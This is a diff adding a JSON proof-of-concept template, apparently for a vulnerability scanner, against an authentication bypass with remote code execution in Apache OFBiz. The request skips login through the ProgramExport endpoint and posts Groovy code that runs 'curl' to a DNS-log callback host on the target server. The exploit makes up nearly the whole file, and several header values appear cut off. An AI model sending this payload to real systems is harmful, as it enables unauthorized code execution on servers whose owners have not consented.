@@ -1,0 +1,29 @@
+{
+	"name":"ApacheOFBiz身份验证绕过RCE",
+	"tag":"apache",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y",
+		"pocPost":"groovyProgram=import+groovy.lang.GroovyShell%0D%0A%0D%0AGroovyShell+shell+%3D+new+GroovyShell%28%29%3B%0D%0Ashell.evaluate%28%27%22curl+{{dnslog}}%22.execute%28%29%27%29",
+		"header":{
+			"Cookie":" OFBiz.Visitor=10100",
+			"Origin":" https",
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+			"User-Agent":" Mozilla/5.0 (X11; Linux x86_64; rv",
+			"Referer":" https",
+			"Connection":" close",
+			"Sec-Fetch-Dest":" document",
+			"Sec-Fetch-Site":" same-origin",
+			"Accept-Encoding":" gzip, deflate",
+			"Sec-Fetch-Mode":" navigate",
+			"Te":" trailers",
+			"Upgrade-Insecure-Requests":" 1",
+			"Sec-Fetch-User":" ?1",
+			"Accept-Language":" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+			"Content-Length":" 166",
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
